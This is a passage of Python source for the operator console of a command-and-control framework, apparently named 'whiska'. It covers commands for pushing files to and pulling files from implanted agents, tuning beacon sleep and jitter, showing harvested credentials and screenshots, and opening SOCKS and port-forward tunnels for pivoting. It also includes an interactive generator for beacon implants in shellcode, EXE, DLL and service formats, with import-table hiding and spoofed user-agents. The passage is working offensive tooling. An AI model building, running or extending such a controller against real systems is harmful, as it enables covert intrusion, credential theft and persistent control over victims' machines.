                if c not in current:
                    current.append(c)
            try:
                self.client.subscribe(current)
                self.client._ws_subscriptions = current
                console.print(f"[green]Subscribed to: {', '.join(cats)}[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return
        if args[0] == "remove" and len(args) > 1:
            cats = args[1:]
            current = [c for c in self.client._ws_subscriptions if c not in cats]
            try:
                self.client.subscribe(current)
                self.client._ws_subscriptions = current
                console.print(f"[green]Unsubscribed from: {', '.join(cats)}[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return
        console.print("[yellow]Usage: subscribe [list|add <categories>|remove <categories>][/yellow]")

    def _cmd_upload(self, args, line):
        """Upload local file to an agent: upload <local_path> <agent_id> <remote_path>"""
        if len(args) < 3:
            console.print("[yellow]Usage: upload <local_path> <agent_id> <remote_path>[/yellow]")
            console.print("[dim]  Example: upload /tmp/tool.exe 358f1838 C:\\Users\\Public\\tool.exe[/dim]")
            return
        local_path = args[0]
        match = self._find_agent(args[1])
        if not match:
            console.print(f"[red]Agent not found: {args[1]}[/red]")
            return
        remote_path = " ".join(args[2:])
        self._do_upload(match.id, local_path, remote_path)

    def _cmd_agent_upload(self, args, line):
        """Upload local file in interact mode: upload <local_path> <remote_path>"""
        if len(args) < 2:
            console.print("[yellow]Usage: upload <local_path> <remote_path>[/yellow]")
            console.print("[dim]  Example: upload /tmp/tool.exe C:\\Users\\Public\\tool.exe[/dim]")
            return
        local_path = args[0]
        remote_path = " ".join(args[1:])
        self._do_upload(self.current_agent_id, local_path, remote_path)

    def _do_upload(self, agent_id: str, local_path: str, remote_path: str):
        """Upload a local file to server temp storage, then send upload command to agent."""
        local_path = os.path.expanduser(local_path)
        if not os.path.isfile(local_path):
            console.print(f"[red]File not found: {local_path}[/red]")
            return
        size = os.path.getsize(local_path)
        console.print(f"[dim]Uploading {os.path.basename(local_path)} ({self._human_size(size)}) to server...[/dim]")
        try:
            file_id = self.client.upload_temp_file(local_path)
            console.print(f"[green]File uploaded to server (id: {file_id[:8]})[/green]")
        except Exception as e:
            console.print(f"[red]Upload to server failed: {e}[/red]")
            return
        console.print(f"[dim]Sending upload command to agent → {remote_path}[/dim]")
        try:
            data = {
                "command": "upload",
                "local_file": {"__file_ref": file_id},
                "remote_path": remote_path,
            }
            self.client.agent_command_execute(
                agent_id, f"upload {remote_path}", data=data,
            )
            console.print(f"[green]Upload command sent to agent[/green]")
        except Exception as e:
            console.print(f"[red]Upload command failed: {e}[/red]")

    def _cmd_agent_download(self, args, line):
        """Download file from agent in interact mode: download <remote_path>"""
        if not args:
            console.print("[yellow]Usage: download <remote_path>[/yellow]")
            console.print("[dim]  Sends download command to agent. Use 'downloads' to list, 'back' + 'download <id>' to save.[/dim]")
            return
        remote_path = " ".join(args)
        try:
            self.client.agent_command_raw(self.current_agent_id, f'download "{remote_path}"')
            console.print(f"[green]Download command sent: {remote_path}[/green]")
            console.print("[dim]Check 'downloads' list when complete, then 'back' → 'download <id>' to save locally[/dim]")
        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")

    def _cmd_agent_sleep(self, args, line):
        """Set sleep in interact mode: sleep <seconds>"""
        if not args:
            agent = self.client.agents.get(self.current_agent_id)
            if agent:
                console.print(f"[dim]Current sleep: {agent.sleep}s[/dim]")
            console.print("[yellow]Usage: sleep <seconds>[/yellow]")
            return
        try:
            self.client.agent_command_raw(self.current_agent_id, f"sleep {args[0]}")
            console.print(f"[green]Sleep set to {args[0]}s[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_agent_jitter(self, args, line):
        """Set jitter in interact mode: jitter <percent>"""
        if not args:
            agent = self.client.agents.get(self.current_agent_id)
            if agent:
                console.print(f"[dim]Current jitter: {agent.jitter}%[/dim]")
            console.print("[yellow]Usage: jitter <0-100>[/yellow]")
            return
        try:
            self.client.agent_command_raw(self.current_agent_id, f"jitter {args[0]}")
            console.print(f"[green]Jitter set to {args[0]}%[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_agent_color(self, args, line):
        """Set agent color: color [bg] [fg] | color reset"""
        if not args:
            console.print("[yellow]Usage: color <bg_hex> [fg_hex] | color reset[/yellow]")
            console.print("[dim]  Example: color #ff0000 #ffffff  or  color reset[/dim]")
            return
        if args[0] == "reset":
            try:
                self.client.agent_set_color([self.current_agent_id], reset=True)
                console.print("[green]Color reset[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return
        bg = args[0]
        fg = args[1] if len(args) > 1 else ""
        try:
            self.client.agent_set_color([self.current_agent_id], bg=bg, fg=fg)
            console.print(f"[green]Color set: bg={bg} fg={fg or 'default'}[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_tasks(self, args, line):
        agent_id = args[0] if args else (self.current_agent_id or "")
        if not agent_id:
            console.print("[yellow]Usage: tasks <agent_id>[/yellow]")
            return

        match = self._find_agent(agent_id)
        if not match:
            console.print(f"[red]Agent not found: {agent_id}[/red]")
            return

        try:
            tasks_data = self.client.task_list(match.id)
        except Exception as e:
            console.print(f"[red]{e}[/red]")
            return

        if not tasks_data:
            console.print("[dim]No tasks[/dim]")
            return

        t = Table(title=f"Tasks for {match.id[:8]}", box=box.ROUNDED)
        t.add_column("TaskID", style="cyan", max_width=10)
        t.add_column("Command", max_width=40)
        t.add_column("Client")
        t.add_column("Status")
        t.add_column("Start")
        t.add_column("End")

        if isinstance(tasks_data, list):
            for tk in tasks_data:
                completed = tk.get("a_completed", False)
                status = "[green]Done[/green]" if completed else "[yellow]Pending[/yellow]"
                t.add_row(
                    str(tk.get("a_task_id", ""))[:8],
                    tk.get("a_cmdline", ""),
                    tk.get("a_client", ""),
                    status,
                    ts_to_str(int(tk.get("a_start_time", 0))),
                    ts_to_str(int(tk.get("a_finish_time", 0))),
                )
        console.print(t)

    def _cmd_agent_tasks(self, args, line):
        self._cmd_tasks([self.current_agent_id], line)

    def _cmd_downloads(self, args, line):
        t = Table(title="Downloads", box=box.ROUNDED)
        t.add_column("FileID", style="cyan", max_width=10)
        t.add_column("Filename")
        t.add_column("Agent")
        t.add_column("Size")
        t.add_column("Received")
        t.add_column("State")
        t.add_column("Date")

        for dl in self.client.downloads.values():
            state = DOWNLOAD_STATE_NAMES.get(dl.state, str(dl.state))
            t.add_row(
                dl.file_id[:8], dl.filename, dl.agent_name or dl.agent_id[:8],
                self._human_size(dl.total_size),
                self._human_size(dl.recv_size),
                state,
                ts_to_str(dl.date),
            )

        if not self.client.downloads:
            console.print("[dim]No downloads[/dim]")
        else:
            console.print(t)

    def _cmd_download_file(self, args, line):
        if not args:
            console.print("[yellow]Usage: download <file_id> [save_path][/yellow]")
            return

        file_id = args[0]
        # Find full ID from partial match
        full_id = None
        for fid in self.client.downloads:
            if fid.startswith(file_id):
                full_id = fid
                break

        if not full_id:
            console.print(f"[red]Download not found: {file_id}[/red]")
            return

        save_path = args[1] if len(args) > 1 else None

        try:
            _, content = self.client.download_sync(full_id)
            # Use filename from sync data (server API truncates at first underscore)
            dl_info = self.client.downloads.get(full_id)
            raw_name = dl_info.filename if dl_info else "unknown"
            # Handle Windows paths on Linux: split on both / and \
            filename = raw_name.replace("\\", "/").rsplit("/", 1)[-1]
            if not save_path:
                dl_dir = os.path.join(os.getcwd(), "downloads")
                os.makedirs(dl_dir, exist_ok=True)
                save_path = os.path.join(dl_dir, filename)
                # Avoid overwriting existing files
                base, ext = os.path.splitext(save_path)
                n = 1
                while os.path.exists(save_path):
                    save_path = f"{base}_{n}{ext}"
                    n += 1
            with open(save_path, "wb") as f:
                f.write(content)
            console.print(f"[green]Saved: {save_path} ({len(content)} bytes)[/green]")
        except Exception as e:
            console.print(f"[red]Download failed: {e}[/red]")

    def _cmd_creds(self, args, line):
        t = Table(title="Credentials", box=box.ROUNDED)
        t.add_column("ID", style="cyan", max_width=10)
        t.add_column("Username")
        t.add_column("Password")
        t.add_column("Type")
        t.add_column("Realm")
        t.add_column("Host")
        t.add_column("Tag")
        t.add_column("Storage")

        for c in self.client.credentials.values():
            t.add_row(
                c.cred_id[:8], c.username, c.password,
                c.cred_type, c.realm, c.host,
                c.tag, c.storage,
            )

        if not self.client.credentials:
            console.print("[dim]No credentials[/dim]")
        else:
            console.print(t)

    def _cmd_targets(self, args, line):
        t = Table(title="Targets", box=box.ROUNDED)
        t.add_column("ID", style="cyan", max_width=10)
        t.add_column("Computer")
        t.add_column("Domain")
        t.add_column("Address")
        t.add_column("OS")
        t.add_column("Alive")
        t.add_column("Tag")
        t.add_column("Info", max_width=30)

        for tgt in self.client.targets.values():
            alive = "[green]Yes[/green]" if tgt.alive else "[red]No[/red]"
            t.add_row(
                tgt.target_id[:8], tgt.computer, tgt.domain,
                tgt.address, OS_NAMES.get(tgt.os, "?"),
                alive, tgt.tag, tgt.info,
            )

        if not self.client.targets:
            console.print("[dim]No targets[/dim]")
        else:
            console.print(t)

    def _cmd_tunnels(self, args, line):
        if not args:
            self._tunnels_list()
            return

        sub = args[0].lower()

        if sub == "start":
            if len(args) < 2:
                self._tunnels_start_help()
                return
            ttype = args[1].lower()
            rest = args[2:]
            self._tunnels_start(ttype, rest)

        elif sub == "stop":
            if not args[1:]:
                console.print("[yellow]Usage: tunnels stop <tunnel_id>[/yellow]")
                return
            tid_prefix = args[1]
            full_id = None
            for tid in self.client.tunnels:
                if tid.startswith(tid_prefix):
                    full_id = tid
                    break
            if not full_id:
                console.print(f"[red]Tunnel not found: {tid_prefix}[/red]")
                return
            try:
                self.client.tunnel_stop(full_id)
                console.print(f"[green]Tunnel {tid_prefix} stopped[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        else:
            console.print(f"[yellow]Unknown subcommand: {sub}. Use: start / stop[/yellow]")
            self._tunnels_list()

    def _tunnels_list(self):
        t = Table(title="Tunnels", box=box.ROUNDED)
        t.add_column("ID", style="cyan", max_width=10)
        t.add_column("Type")
        t.add_column("Agent")
        t.add_column("Bind")
        t.add_column("Forward")
        t.add_column("Info")
        t.add_column("Client")

        for tun in self.client.tunnels.values():
            bind = f"{tun.interface}:{tun.port}" if tun.interface else tun.port
            fwd = f"{tun.fhost}:{tun.fport}" if tun.fhost else "-"
            t.add_row(
                tun.tunnel_id[:8], tun.tun_type,
                tun.agent_id[:8] if tun.agent_id else "-",
                bind, fwd, tun.info, tun.client,
            )

        if not self.client.tunnels:
            console.print("[dim]No tunnels[/dim]")
        else:
            console.print(t)
        console.print("[dim]Subcommands: tunnels start socks5/socks4/lportfwd/rportfwd ... | tunnels stop <id>[/dim]")

    def _tunnels_start_help(self):
        console.print("[bold]tunnels start[/bold] — create a tunnel")
        console.print("  [cyan]tunnels start socks5  <agent_id> <lport> [--auth user pass] [--desc text][/cyan]")
        console.print("  [cyan]tunnels start socks4  <agent_id> <lport> [--desc text][/cyan]")
        console.print("  [cyan]tunnels start lportfwd <agent_id> <lport> <thost> <tport> [--desc text][/cyan]")
        console.print("  [cyan]tunnels start rportfwd <agent_id> <port>  <thost> <tport> [--desc text][/cyan]")
        console.print("[dim]  agent_id: partial match, computer name, or short ID[/dim]")

    def _tunnels_start(self, ttype: str, rest: list[str]):
        if not rest:
            self._tunnels_start_help()
            return

        # Parse --desc and --auth flags
        desc = ""
        auth_user = ""
        auth_pass = ""
        clean = []
        i = 0
        while i < len(rest):
            if rest[i] == "--desc" and i + 1 < len(rest):
                desc = rest[i + 1]; i += 2
            elif rest[i] == "--auth" and i + 2 < len(rest):
                auth_user = rest[i + 1]; auth_pass = rest[i + 2]; i += 3
            else:
                clean.append(rest[i]); i += 1

        agent_match = self._find_agent(clean[0]) if clean else None

        if ttype in ("socks5", "socks4"):
            if len(clean) < 2:
                console.print(f"[yellow]Usage: tunnels start {ttype} <agent_id> <lport>[/yellow]")
                return
            if not agent_match:
                console.print(f"[red]Agent not found: {clean[0]}[/red]")
                return
            try:
                lport = int(clean[1])
            except ValueError:
                console.print("[red]lport must be an integer[/red]")
                return
            try:
                if ttype == "socks5":
                    use_auth = bool(auth_user and auth_pass)
                    tid = self.client.tunnel_start_socks5(
                        agent_match.id, "0.0.0.0", lport, desc=desc,
                        use_auth=use_auth, username=auth_user, password=auth_pass,
                    )
                else:
                    tid = self.client.tunnel_start_socks4(agent_match.id, "0.0.0.0", lport, desc=desc)
                console.print(f"[green]{ttype.upper()} tunnel started on port {lport} (ID: {tid[:8] if tid else '?'})[/green]")
                if ttype == "socks5":
                    console.print(f"[dim]  proxychains: socks5 127.0.0.1 {lport}{' ' + auth_user + ' ' + auth_pass if auth_user else ''}[/dim]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif ttype == "lportfwd":
            if len(clean) < 4:
                console.print("[yellow]Usage: tunnels start lportfwd <agent_id> <lport> <thost> <tport>[/yellow]")
                return
            if not agent_match:
                console.print(f"[red]Agent not found: {clean[0]}[/red]")
                return
            try:
                lport, tport = int(clean[1]), int(clean[3])
            except ValueError:
                console.print("[red]ports must be integers[/red]")
                return
            thost = clean[2]
            try:
                tid = self.client.tunnel_start_lportfwd(
                    agent_match.id, "127.0.0.1", lport, thost, tport, desc=desc,
                )
                console.print(f"[green]Local port forward: 127.0.0.1:{lport} → {thost}:{tport} (ID: {tid[:8] if tid else '?'})[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif ttype == "rportfwd":
            if len(clean) < 4:
                console.print("[yellow]Usage: tunnels start rportfwd <agent_id> <port> <thost> <tport>[/yellow]")
                return
            if not agent_match:
                console.print(f"[red]Agent not found: {clean[0]}[/red]")
                return
            try:
                port, tport = int(clean[1]), int(clean[3])
            except ValueError:
                console.print("[red]ports must be integers[/red]")
                return
            thost = clean[2]
            try:
                tid = self.client.tunnel_start_rportfwd(
                    agent_match.id, port, thost, tport, desc=desc,
                )
                console.print(f"[green]Reverse port forward: agent:{port} → {thost}:{tport} (ID: {tid[:8] if tid else '?'})[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        else:
            console.print(f"[yellow]Unknown tunnel type: {ttype}. Use: socks5 / socks4 / lportfwd / rportfwd[/yellow]")

    def _cmd_interact_tunnel(self, ttype: str, args: list[str], line: str):
        """Create tunnel from interact mode — agent_id is current agent."""
        agent_match = self.client.agents.get(self.current_agent_id)
        if not agent_match:
            console.print("[red]Agent not found[/red]")
            return

        desc = ""
        auth_user = ""
        auth_pass = ""
        clean = []
        i = 0
        while i < len(args):
            if args[i] == "--desc" and i + 1 < len(args):
                desc = args[i + 1]; i += 2
            elif args[i] == "--auth" and i + 2 < len(args):
                auth_user = args[i + 1]; auth_pass = args[i + 2]; i += 3
            else:
                clean.append(args[i]); i += 1

        if ttype in ("socks5", "socks4"):
            if not clean:
                console.print(f"[yellow]Usage: {ttype} <lport> [--desc text][/yellow]")
                return
            try:
                lport = int(clean[0])
            except ValueError:
                console.print("[red]lport must be an integer[/red]")
                return
            try:
                if ttype == "socks5":
                    use_auth = bool(auth_user and auth_pass)
                    tid = self.client.tunnel_start_socks5(
                        self.current_agent_id, "0.0.0.0", lport, desc=desc,
                        use_auth=use_auth, username=auth_user, password=auth_pass,
                    )
                else:
                    tid = self.client.tunnel_start_socks4(self.current_agent_id, "0.0.0.0", lport, desc=desc)
                console.print(f"[green]{ttype.upper()} tunnel started on port {lport} (ID: {tid[:8] if tid else '?'})[/green]")
                if ttype == "socks5":
                    console.print(f"[dim]  proxychains: socks5 127.0.0.1 {lport}{' ' + auth_user + ' ' + auth_pass if auth_user else ''}[/dim]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif ttype == "lportfwd":
            if len(clean) < 3:
                console.print("[yellow]Usage: lportfwd <lport> <thost> <tport>[/yellow]")
                return
            try:
                lport, tport = int(clean[0]), int(clean[2])
            except ValueError:
                console.print("[red]ports must be integers[/red]")
                return
            thost = clean[1]
            try:
                tid = self.client.tunnel_start_lportfwd(
                    self.current_agent_id, "127.0.0.1", lport, thost, tport, desc=desc,
                )
                console.print(f"[green]Local port forward: 127.0.0.1:{lport} → {thost}:{tport} (ID: {tid[:8] if tid else '?'})[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif ttype == "rportfwd":
            if len(clean) < 3:
                console.print("[yellow]Usage: rportfwd <port> <thost> <tport>[/yellow]")
                return
            try:
                port, tport = int(clean[0]), int(clean[2])
            except ValueError:
                console.print("[red]ports must be integers[/red]")
                return
            thost = clean[1]
            try:
                tid = self.client.tunnel_start_rportfwd(
                    self.current_agent_id, port, thost, tport, desc=desc,
                )
                console.print(f"[green]Reverse port forward: agent:{port} → {thost}:{tport} (ID: {tid[:8] if tid else '?'})[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

    def _cmd_pivots(self, args, line):
        t = Table(title="Pivots", box=box.ROUNDED)
        t.add_column("ID", style="cyan", max_width=10)
        t.add_column("Name")
        t.add_column("Parent Agent")
        t.add_column("Child Agent")

        for pv in self.client.pivots.values():
            t.add_row(
                pv.pivot_id[:8], pv.pivot_name,
                pv.parent_agent_id[:8] if pv.parent_agent_id else "-",
                pv.child_agent_id[:8] if pv.child_agent_id else "-",
            )

        if not self.client.pivots:
            console.print("[dim]No pivots[/dim]")
        else:
            console.print(t)

    def _cmd_config(self, args, line):
        """Manage persistent settings: config [show] | config set <key> <value>"""
        if not args or args[0] == "show":
            cfg = load_config()
            tg_tok = cfg_get("tg_token", "WHISKA_TG_TOKEN")
            tg_chat = cfg_get("tg_chat", "WHISKA_TG_CHAT")

            t = Table(title="Config (~/.whiskacli/config)", box=box.SIMPLE, show_header=False)
            t.add_column("Key", style="cyan")
            t.add_column("Value")
            t.add_column("Source", style="dim")

            def _src(key: str, env: str) -> str:
                return "env" if os.environ.get(env) else ("file" if cfg.get(key) else "not set")

            tok_display = (tg_tok[:6] + "..." + tg_tok[-4:]) if len(tg_tok) > 12 else ("(not set)" if not tg_tok else "***")
            t.add_row("tg_token", tok_display, _src("tg_token", "WHISKA_TG_TOKEN"))
            t.add_row("tg_chat",  tg_chat or "(not set)", _src("tg_chat", "WHISKA_TG_CHAT"))
            console.print(t)
            console.print("[dim]Set with: config set tg_token <bot_token>[/dim]")
            console.print("[dim]           config set tg_chat  <chat_id>[/dim]")
            return

        if args[0] == "set":
            if len(args) < 3:
                console.print("[yellow]Usage: config set <key> <value>[/yellow]")
                return
            key = args[1].lower()
            value = " ".join(args[2:])
            save_config(key, value)
            console.print(f"[green]Saved {key} to ~/.whiskacli/config[/green]")
            return

        console.print("[yellow]Usage: config [show] | config set <key> <value>[/yellow]")

    def _cmd_screenshots(self, args, line):
        if args and args[0] == "save":
            self._cmd_screenshot_save(args[1:])
            return

        t = Table(title="Screenshots", box=box.ROUNDED)
        t.add_column("ID", style="cyan", max_width=10)
        t.add_column("User")
        t.add_column("Computer")
        t.add_column("Note")
        t.add_column("Date")

        for sc in self.client.screenshots.values():
            t.add_row(sc.screen_id[:8], sc.user, sc.computer, sc.note, ts_to_str(sc.date))

        if not self.client.screenshots:
            console.print("[dim]No screenshots[/dim]")
        else:
            console.print(t)
            console.print("[dim]Use 'screenshots save <id> [path]' to save an image[/dim]")

    def _cmd_screenshot_save(self, args):
        if not args:
            console.print("[yellow]Usage: screenshots save <screen_id> [save_path][/yellow]")
            return
        sid = args[0]
        full_id = None
        for s in self.client.screenshots:
            if s.startswith(sid):
                full_id = s
                break
        if not full_id:
            console.print(f"[red]Screenshot not found: {sid}[/red]")
            return
        save_path = args[1] if len(args) > 1 else None
        try:
            img_data = self.client.screenshot_get_image(full_id)
            if not save_path:
                sc = self.client.screenshots[full_id]
                dl_dir = os.path.join(os.getcwd(), "screenshots")
                os.makedirs(dl_dir, exist_ok=True)
                ts = ts_to_str(sc.date).replace(" ", "_").replace(":", "")
                save_path = os.path.join(dl_dir, f"{sc.computer}_{ts}.png")
            with open(save_path, "wb") as f:
                f.write(img_data)
            console.print(f"[green]Screenshot saved: {save_path} ({len(img_data)} bytes)[/green]")
        except Exception as e:
            console.print(f"[red]Screenshot save failed: {e}[/red]")

    def _cmd_chat(self, args, line):
        if args:
            msg = " ".join(args)
            try:
                self.client.chat_send(msg)
            except Exception as e:
                console.print(f"[red]Chat error: {e}[/red]")
        else:
            # Show recent messages
            if not self.client.chat_messages:
                console.print("[dim]No chat messages[/dim]")
                return
            for msg in self.client.chat_messages[-20:]:
                ts = ts_to_str(msg.date)
                console.print(f"[dim]{ts}[/dim] [bold]{msg.username}[/bold]: {msg.message}")

    def _cmd_extenders(self, args, line):
        """Show loaded extenders: listener types, agent types, services."""
        console.print("[bold]Listener Types[/bold]")
        if self.client.listener_regs:
            t = Table(box=box.SIMPLE)
            t.add_column("Name", style="cyan")
            t.add_column("Protocol")
            t.add_column("Type")
            for name, lr in self.client.listener_regs.items():
                t.add_row(name, lr.protocol, lr.l_type)
            console.print(t)
        else:
            console.print("  [dim]None[/dim]")

        console.print("[bold]Agent Types[/bold]")
        if self.client.agent_regs:
            t = Table(box=box.SIMPLE)
            t.add_column("Name", style="cyan")
            t.add_column("Listeners")
            t.add_column("Multi")
            for name, ar in self.client.agent_regs.items():
                t.add_row(name, ", ".join(ar.listeners), str(ar.multi_listeners))
            console.print(t)
        else:
            console.print("  [dim]None[/dim]")

        console.print("[bold]Services[/bold]")
        if self.client.services:
            for name in self.client.services:
                console.print(f"  [cyan]{name}[/cyan]")
        else:
            console.print("  [dim]None[/dim]")

    def _cmd_services(self, args, line):
        if not args:
            if not self.client.services:
                console.print("[dim]No registered services[/dim]")
                return
            t = Table(title="Services", box=box.ROUNDED)
            t.add_column("Name", style="cyan")
            t.add_column("Has Data")
            for name, svc in self.client.services.items():
                has_data = "Yes" if svc.get("data") else "No"
                t.add_row(name, has_data)
            console.print(t)
            console.print("[dim]Usage: services call <name> <command> [args_json][/dim]")
            console.print("[dim]       services config <name>  — fetch & display config[/dim]")
            return

        subcmd = args[0].lower()

        if subcmd == "call" and len(args) >= 3:
            svc_name = args[1]
            command = args[2]
            svc_args = " ".join(args[3:]) if len(args) > 3 else "{}"
            try:
                resp = self.client.service_call(svc_name, command, svc_args)
                console.print(f"[green]Call sent[/green]: {resp}")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return

        if subcmd == "config" and len(args) >= 2:
            import json as _json
            svc_name = args[1]

            import threading as _threading
            svc_data_holder = []
            orig_raw = self.client.on_raw_packet
            _got = _threading.Event()

            def _capture(pkt):
                if pkt.get("type") == 0x19 and pkt.get("service") == svc_name:
                    svc_data_holder.append(pkt.get("data", ""))
                    _got.set()
                if orig_raw:
                    orig_raw(pkt)

            self.client.on_raw_packet = _capture
            try:
                self.client.service_call(svc_name, "get_config", "{}")
                _got.wait(timeout=10)
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            finally:
                self.client.on_raw_packet = orig_raw

            if svc_data_holder:
                try:
                    data = _json.loads(svc_data_holder[0])
                    console.print(Panel(
                        _json.dumps(data, indent=2, ensure_ascii=False),
                        title=f"{svc_name} config",
                        border_style="cyan",
                    ))
                except Exception:
                    console.print(svc_data_holder[0])
            else:
                console.print("[yellow]No config data received[/yellow]")
            return

        console.print("[yellow]Usage: services call <name> <command> [args_json][/yellow]")
        console.print("[yellow]       services config <name>[/yellow]")

    @staticmethod
    def _pick(prompt_text: str, options: list[str], default: int = 0) -> str | None:
        """Show a numbered menu and return the chosen option, or None on cancel."""
        console.print(f"\n[bold]{prompt_text}[/bold]")
        for i, opt in enumerate(options):
            marker = "[cyan]>[/cyan]" if i == default else " "
            console.print(f"  {marker} [cyan]{i + 1}[/cyan]) {opt}")
        try:
            raw = input(f"  Choice [{default + 1}]: ").strip()
        except (EOFError, KeyboardInterrupt):
            return None
        if not raw:
            return options[default]
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(options):
                return options[idx]
        except ValueError:
            for opt in options:
                if opt.lower() == raw.lower():
                    return opt
        console.print("[red]Invalid choice[/red]")
        return None

    @staticmethod
    def _ask(prompt_text: str, default: str = "") -> str | None:
        """Simple input prompt with default value."""
        suffix = f" [{default}]" if default else ""
        try:
            raw = input(f"  {prompt_text}{suffix}: ").strip()
        except (EOFError, KeyboardInterrupt):
            return None
        return raw if raw else default

    def _cmd_generate(self, args, line):
        """Generate an agent payload (interactive or flag-based)."""
        import json as _json

        regs = self.client.agent_regs
        if not regs:
            console.print("[yellow]No agent types registered[/yellow]")
            return

        # ── Flag-based mode: generate <type> <listener> [--flag val ...] ──
        if len(args) >= 2 and any(a.startswith("--") for a in args[2:]):
            self._cmd_generate_flags(args, regs)
            return

        # ── Interactive mode ─────────────────────────────────────────────
        console.print(Panel("[bold]Payload Generator[/bold]", border_style="cyan", expand=False))

        # 1. Agent type
        agent_types = list(regs.keys())
        if len(agent_types) == 1:
            agent_type = agent_types[0]
            console.print(f"  Agent type: [cyan]{agent_type}[/cyan]")
        else:
            agent_type = self._pick("Agent type:", agent_types)
            if not agent_type:
                return

        ar = regs[agent_type]

        # 2. Listener — only show active listeners compatible with this agent type
        compatible = []
        for name, li in self.client.listeners.items():
            if li.reg_name in ar.listeners:
                compatible.append((name, li))

        if not compatible:
            console.print(f"[yellow]No active listeners for {agent_type}[/yellow]")
            console.print(f"[dim]Required types: {', '.join(ar.listeners)}[/dim]")
            return

        if len(compatible) == 1:
            listener_name = compatible[0][0]
            li = compatible[0][1]
            console.print(f"  Listener: [cyan]{listener_name}[/cyan] ({li.protocol} {li.bind_host}:{li.bind_port})")
        else:
            listener_opts = [f"{name} ({li.protocol} {li.bind_host}:{li.bind_port})" for name, li in compatible]
            choice = self._pick("Listener:", listener_opts)
            if not choice:
                return
            idx = listener_opts.index(choice)
            listener_name = compatible[idx][0]

        # Determine listener type for format-specific options
        li_obj = self.client.listeners.get(listener_name)
        li_reg_name = li_obj.reg_name if li_obj else ""

        # 3. Format
        if agent_type == "beacon":
            formats = ["Shellcode", "Exe", "DLL", "Service Exe"]
        elif agent_type == "beacon_linux":
            formats = ["Binary EXE"]
        else:
            formats = ["Binary EXE", "DLL", "Shellcode"]
        fmt = self._pick("Format:", formats)
        if not fmt:
            return

        # 4. Architecture
        if agent_type == "beacon":
            archs = ["x64", "x86"]
        elif agent_type == "beacon_linux":
            archs = ["linux/amd64", "linux/arm64", "darwin/amd64", "darwin/arm64", "windows/amd64", "windows/386"]
        else:
            archs = ["amd64", "386", "arm64"]
        arch = self._pick("Architecture:", archs)
        if not arch:
            return

        # 5. Sleep & Jitter
        sleep_val = self._ask("Sleep interval", "30s")
        if sleep_val is None:
            return
        jitter_val = self._ask("Jitter %", "20")
        if jitter_val is None:
            return
        try:
            jitter_int = max(0, min(100, int(jitter_val)))
        except ValueError:
            jitter_int = 0

        # 6. IAT Hiding (beacon only)
        iat_hiding = False
        if agent_type == "beacon":
            iat_choice = self._pick("IAT Hiding (empty import table):", ["Yes", "No"], default=0)
            if iat_choice is None:
                return
            iat_hiding = iat_choice == "Yes"

        # 6b. User-Agent (beacon_linux — must match listener's UA list)
        user_agent = ""
        if agent_type == "beacon_linux":
            user_agent = self._ask(
                "User-Agent (must match listener UA list)",
                "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",
            )
            if user_agent is None:
                return

        # 7. Service name (if Service Exe)
        svcname = ""
        if fmt == "Service Exe":
            svcname = self._ask("Service name", "AgentService")
            if svcname is None:
                return

        # 8. Output path
        if fmt == "Shellcode":
            default_ext = ".bin"
        elif fmt == "DLL":
            default_ext = ".dll"
        elif "Service" in fmt:
            default_ext = ".exe"
        elif fmt == "Exe" or "EXE" in fmt:
            default_ext = ".exe"
        else:
            default_ext = ""

        safe_arch = arch.replace("/", "_")
        default_name = f"agent_{agent_type}_{safe_arch}{default_ext}"
        output_path = self._ask("Output file", default_name)
        if output_path is None:
            return

        # ── Build config ─────────────────────────────────────────────────
        if agent_type == "beacon":
            config = {
                "arch": arch,
                "format": fmt,
                "sleep": sleep_val,
                "jitter": jitter_int,
                "svcname": svcname,
                "is_killdate": False,
                "kill_date": "",
                "kill_time": "",
                "is_workingtime": False,
                "start_time": "",
                "end_time": "",
                "iat_hiding": iat_hiding,
                "is_sideloading": False,
                "sideloading_content": "",
                "dns_resolvers": "8.8.8.8,1.1.1.1,9.9.9.9",
                "dns_mode": "DNS (Direct UDP)",
                "doh_resolvers": "https://dns.google/dns-query,https://cloudflare-dns.com/dns-query",
                "user_agent": "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",
                "use_proxy": False,
                "proxy_type": "http",
                "proxy_host": "",
                "proxy_port": 0,
                "proxy_username": "",
                "proxy_password": "",
                "rotation_mode": "sequential",
            }
        elif agent_type == "beacon_linux":
            config = {
                "arch": arch,
                "sleep": sleep_val,
                "jitter": jitter_int,
                "user_agent": user_agent,
            }
        else:
            config = {
                "arch": arch,
                "format": fmt,
                "sleep": sleep_val,
                "jitter": jitter_int,
            }

        config_str = _json.dumps(config)

        # ── Summary ──────────────────────────────────────────────────────
        console.print()
        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
        t.add_column("", style="dim")
        t.add_column("")
        t.add_row("Agent", agent_type)
        t.add_row("Listener", listener_name)
        if agent_type != "beacon_linux":
            t.add_row("Format", fmt)
        t.add_row("Arch", arch)
        t.add_row("Sleep/Jitter", f"{sleep_val} / {jitter_int}%")
        if user_agent:
            t.add_row("User-Agent", user_agent[:60] + ("..." if len(user_agent) > 60 else ""))
        if iat_hiding:
            t.add_row("IAT Hiding", "Yes")
        if svcname:
            t.add_row("Service Name", svcname)
        t.add_row("Output", output_path)
        console.print(Panel(t, title="[bold]Generate Summary[/bold]", border_style="cyan", expand=False))

        try:
            confirm = input("  Proceed? [Y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
